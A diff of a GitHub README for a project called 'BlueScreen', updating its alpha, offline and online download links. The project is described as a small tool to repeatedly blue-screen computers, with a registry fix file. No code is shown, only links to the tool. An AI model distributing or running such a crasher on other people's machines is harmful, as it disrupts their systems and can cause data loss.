@@ -3,8 +3,7 @@
 
 [Alpha Version (sometimes untested and unstable)](https://github.com/harryaldwithjarryald/BlueScreen/archive/refs/heads/main.zip)
 <br>
-[Offline Version (11.00 legacy)](https://github.com/harryaldwithjarryald/BlueScreen/releases/tag/offline-11.00)
-12.00 offline coming soon...
+[Offline Version (12.00 legacy)](https://github.com/harryaldwithjarryald/BlueScreen/releases/tag/offline-12.00)
 <br>
 # [Online Version (Latest)](https://github.com/harryaldwithjarryald/BlueScreen/releases/tag/online)
 # A simple OPEN SOURCE AND LESS THAN 1MB tool to contantly blue screen computers and includes a fix ([fix.REG](https://github.com/harryaldwithjarryald/BlueScreen/releases/download/online/fix.REG))
